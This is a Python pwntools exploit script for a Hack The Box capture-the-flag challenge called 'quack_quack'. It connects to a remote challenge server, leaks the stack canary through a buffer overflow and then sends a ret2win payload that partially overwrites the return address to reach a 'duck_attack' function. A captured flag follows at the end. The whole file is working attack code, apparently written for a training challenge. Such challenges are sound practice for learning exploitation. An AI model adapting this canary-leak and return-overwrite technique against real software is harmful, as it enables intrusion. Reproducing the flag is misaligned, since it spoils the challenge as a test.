from pwn import *

e = ELF("./quack_quack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

script = '''
b *duckling
b *duckling + 194
b *duckling + 314
'''

p = remote("94.237.48.197", 50640)
#p = process("./quack_quack_patched")
#p = gdb.debug("./quack_quack_patched", gdbscript = script)

# leak canary
payload = b"A" * 0x59 + b"Quack Quack "
p.sendafter(b"Duck!\n\n> ", payload)
p.recvuntil(b"Quack Quack ")
canary = u64(b"\x00" + p.recv(7))
print(hex(canary))

# ret2win
win = e.symbols['duck_attack'] & 0xffff
payload = b"A" * 0x58 + p64(canary) + p64(0) + p16(win)
p.sendafter(b"Duck?\n\n> ", payload)

p.interactive()
#HTB{~c4n4ry_g035_qu4ck_qu4ck~_53e7537596a9df9a63085389956d89d7}